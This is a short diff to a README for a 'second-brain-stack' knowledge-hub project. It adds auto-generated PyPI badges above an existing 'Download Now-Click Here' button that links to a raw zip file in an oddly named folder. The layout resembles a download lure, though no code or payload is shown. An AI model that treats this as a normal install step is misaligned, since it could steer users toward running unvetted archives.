@@ -1,5 +1,12 @@
 # 🧠 second-brain-stack - Your Personal Knowledge Hub Awaits
 
+
+<!-- AUTO-PACKAGE-BADGES:START -->
+<!-- Auto-generated package badges -->
+
+![PyPI version](https://img.shields.io/pypi/v/second-brain-stack?style=flat-square&logo=pypi&color=green) ![PyPI downloads](https://img.shields.io/pypi/dm/second-brain-stack?style=flat-square&color=brightgreen) ![PyPI license](https://img.shields.io/pypi/l/second-brain-stack?style=flat-square) [![Deployed](https://img.shields.io/badge/deployed-0.1.0-blue?style=flat-square)](https://pypi.org/project/second-brain-stack)
+
+<!-- AUTO-PACKAGE-BADGES:END -->
 [![Download](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kapilkaushik1/second-brain-stack/main/inch/second-brain-stack.zip)
 
 ## 📖 Overview
